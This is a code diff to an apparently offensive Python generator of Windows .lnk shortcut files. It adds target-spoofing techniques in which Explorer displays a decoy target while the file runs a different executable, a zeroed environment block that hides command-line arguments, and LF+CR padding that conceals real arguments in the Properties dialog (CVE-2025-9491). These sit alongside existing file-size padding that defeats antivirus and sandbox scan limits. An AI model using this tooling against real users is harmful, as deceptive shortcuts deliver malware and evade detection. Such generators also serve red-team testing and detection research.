@@ -175,6 +175,21 @@ def _counted_utf16(s: str, *, max_length: int = 0) -> bytes:
     return struct.pack("<H", len(s)) + s.encode("utf-16-le")
 
 
+def _counted_ansi(s: str, *, max_length: int = 0) -> bytes:
+    """StringData entry for ANSI mode: uint16 char_count + cp1252 bytes.
+
+    Used when the IsUnicode flag is unset.  The count field is the number
+    of *characters* (= bytes for single-byte codepages like cp1252).
+    """
+    if max_length and len(s) > max_length:
+        raise ValueError(
+            f"StringData field exceeds {max_length}-character limit "
+            f"(got {len(s)} characters)"
+        )
+    encoded = s.encode(ANSI_CODEPAGE)
+    return struct.pack("<H", len(encoded)) + encoded
+
+
 # ---------------------------------------------------------------------------
 # IDList item builders
 # ---------------------------------------------------------------------------
@@ -739,6 +754,38 @@ def _build_env_var_block(env_path: str) -> bytes:
     return _build_788_block(0xA0000001, env_path)
 
 
+def _build_env_var_block_split(ansi: str = "", unicode: str = "") -> bytes:
+    """EnvironmentVariableDataBlock with independent ANSI/Unicode fields.
+
+    Used for target-spoofing techniques where the ANSI and Unicode target
+    paths differ (Beukema Variant 4).  When only the ANSI field is
+    populated and IsUnicode is unset, Explorer displays the IDList target
+    but executes via the ANSI env block path.
+    """
+    block = bytearray(788)
+    struct.pack_into("<I", block, 0, 788)
+    struct.pack_into("<I", block, 4, 0xA0000001)
+    if ansi:
+        encoded = ansi[:259].encode(ANSI_CODEPAGE) + b"\x00"
+        block[8 : 8 + len(encoded)] = encoded
+    if unicode:
+        encoded = unicode[:259].encode("utf-16-le") + b"\x00\x00"
+        block[268 : 268 + len(encoded)] = encoded
+    return bytes(block)
+
+
+def _build_null_env_block() -> bytes:
+    """EnvironmentVariableDataBlock with both fields zeroed.
+
+    Used for Beukema Variant 1: disables the target field in Properties
+    and hides command-line arguments while still passing them at execution.
+    """
+    block = bytearray(788)
+    struct.pack_into("<I", block, 0, 788)
+    struct.pack_into("<I", block, 4, 0xA0000001)
+    return bytes(block)
+
+
 def _build_tracker_block(
     machine_id: str = "",
     droid_volume_id: str = "",
@@ -1018,6 +1065,9 @@ def build_lnk(
     icon_location: str = "",
     icon_env_path: str = "",
     env_target_path: str = "",
+    env_target_ansi: str = "",
+    env_target_unicode: str = "",
+    null_env_block: bool = False,
     icon_index: int = 0,
     description: str = "",
     relative_path: str = "",
@@ -1053,6 +1103,7 @@ def build_lnk(
     network_device_name: str = "",
     network_provider_type: int = 0x00020000,
     pad_args: int = 0,
+    pad_char: str = " ",
     pad_size: int = 0,
     append_data: bytes = b"",
     stomp_motw: str = "",
@@ -1061,6 +1112,7 @@ def build_lnk(
     run_as_user: bool = False,
     enable_target_metadata: bool = False,
     prefer_environment_path: bool = False,
+    force_ansi: bool = False,
 ) -> bytes:
     """Return the raw bytes of a complete .lnk file.
 
@@ -1076,6 +1128,21 @@ def build_lnk(
         icon_location:   Full Windows path to the icon source (StringData).
         icon_env_path:   Icon path with env vars for IconEnvironmentDataBlock.
         env_target_path: Target path with env vars for EnvironmentVariableDataBlock.
+                         Mutually exclusive with env_target_ansi/env_target_unicode
+                         and null_env_block.
+        env_target_ansi: ANSI-only EnvironmentVariableDataBlock target path.
+                         For Beukema Variant 4: set this to the real executable,
+                         set *target* to the decoy path (shown in IDList), and
+                         use *force_ansi=True*.  Mutually exclusive with
+                         env_target_path and null_env_block.
+        env_target_unicode: Unicode-only EnvironmentVariableDataBlock target path.
+                         Can be combined with env_target_ansi for independent
+                         ANSI/Unicode fields.  Mutually exclusive with
+                         env_target_path and null_env_block.
+        null_env_block:  Emit an all-zeros EnvironmentVariableDataBlock.
+                         Beukema Variant 1: disables the target field in
+                         Properties and hides arguments.  Mutually exclusive
+                         with env_target_path and env_target_ansi/unicode.
         icon_index:      Icon resource index within icon_location.
         description:     Tooltip / comment text (Name StringData).
         relative_path:   Relative path from LNK location to target.
@@ -1128,10 +1195,15 @@ def build_lnk(
         network_provider_type: WNNC_NET_* network provider type for UNC targets.
                          Default 0x00020000 (WNNC_NET_LANMAN -- not in v10.0
                          normative table but is the standard SMB/CIFS provider).
-        pad_args:        Number of space characters (0x20) to prepend to
-                         *arguments*, pushing the real args past the ~260-char
-                         visible boundary in the Windows Properties dialog
-                         (ZDI-CAN-25373 / CVE-2025-9491).
+        pad_args:        Number of characters to prepend to *arguments*,
+                         pushing the real args past the ~260-char visible
+                         boundary in the Windows Properties dialog
+                         (ZDI-CAN-25373 / CVE-2025-9491).  Uses *pad_char*
+                         as the fill character (default: space).
+        pad_char:        Fill character(s) for *pad_args* padding.  Defaults
+                         to space (``" "``).  CVE-2025-9491 uses ``"\\n\\r"``
+                         (LF+CR).  When longer than one character, the string
+                         is repeated and truncated to *pad_args* length.
         pad_size:        Number of null bytes to append after the terminal
                          ExtraData block, inflating file size past AV/sandbox
                          scan limits (T1027.001 binary padding).
@@ -1150,10 +1222,32 @@ def build_lnk(
         run_as_user:     Set RunAsUser flag (bit 13).  Target runs elevated.
         enable_target_metadata: Set EnableTargetMetadata flag (bit 19).
         prefer_environment_path: Set PreferEnvironmentPath flag (bit 25).
+        force_ansi:      Suppress the IsUnicode flag and encode StringData
+                         as cp1252 instead of UTF-16LE.  Required for
+                         Beukema Variant 4 (ANSI-only env block spoofing)
+                         and CVE-2025-9491 to match the lnk-it-up reference.
     """
-    # -- Argument padding (ZDI-CAN-25373) --
+    # -- Validate pad_char --
+    if not pad_char:
+        raise ValueError("pad_char must be non-empty")
+
+    # -- Argument padding (ZDI-CAN-25373 / CVE-2025-9491) --
     if pad_args > 0:
-        arguments = " " * pad_args + arguments
+        fill = (pad_char * ((pad_args // len(pad_char)) + 1))[:pad_args]
+        arguments = fill + arguments
+
+    # -- Validate env block mutual exclusivity --
+    has_split_env = bool(env_target_ansi or env_target_unicode)
+    if env_target_path and has_split_env:
+        raise ValueError(
+            "env_target_path is mutually exclusive with "
+            "env_target_ansi/env_target_unicode"
+        )
+    if null_env_block and (env_target_path or has_split_env):
+        raise ValueError(
+            "null_env_block is mutually exclusive with "
+            "env_target_path and env_target_ansi/env_target_unicode"
+        )
 
     # -- Validate stomp_motw --
     if stomp_motw and stomp_motw not in ("dot", "relative"):
@@ -1192,7 +1286,9 @@ def build_lnk(
         )
 
     # -- Flags --
-    flags = 0x00000001 | 0x00000002 | 0x00000080  # IDList + LinkInfo + IsUnicode
+    flags = 0x00000001 | 0x00000002  # IDList + LinkInfo
+    if not force_ansi:
+        flags |= 0x00000080  # IsUnicode
     if description:
         flags |= 0x00000004  # HasName
     if relative_path:
@@ -1205,7 +1301,7 @@ def build_lnk(
         flags |= 0x00000040  # HasIconLocation
     if force_no_link_info:
         flags |= 0x00000100  # ForceNoLinkInfo
-    if env_target_path:
+    if env_target_path or has_split_env or null_env_block:
         flags |= 0x00000200  # HasExpString
     if darwin_data:
         flags |= 0x00001000  # HasDarwinID
@@ -1278,19 +1374,26 @@ def build_lnk(
     # -- StringData (spec order: Name, RelPath, WorkDir, Args, IconLoc) --
     # v10.0 spec (section 2.4): all except COMMAND_LINE_ARGUMENTS are
     # limited to 260 characters.
+    _counted = _counted_ansi if force_ansi else _counted_utf16
     if description:
-        out += _counted_utf16(description, max_length=260)
+        out += _counted(description, max_length=260)
     if relative_path:
-        out += _counted_utf16(relative_path, max_length=260)
+        out += _counted(relative_path, max_length=260)
     if working_dir:
-        out += _counted_utf16(working_dir, max_length=260)
+        out += _counted(working_dir, max_length=260)
     if arguments:
-        out += _counted_utf16(arguments)  # unbounded per spec
+        out += _counted(arguments)  # unbounded per spec
     if icon_location:
-        out += _counted_utf16(icon_location, max_length=260)
+        out += _counted(icon_location, max_length=260)
 
     # -- ExtraData --
-    if env_target_path:
+    if null_env_block:
+        out += _build_null_env_block()
+    elif has_split_env:
+        out += _build_env_var_block_split(
+            ansi=env_target_ansi, unicode=env_target_unicode
+        )
+    elif env_target_path:
         out += _build_env_var_block(env_target_path)
     if icon_env_path:
         out += _build_icon_env_block(icon_env_path)
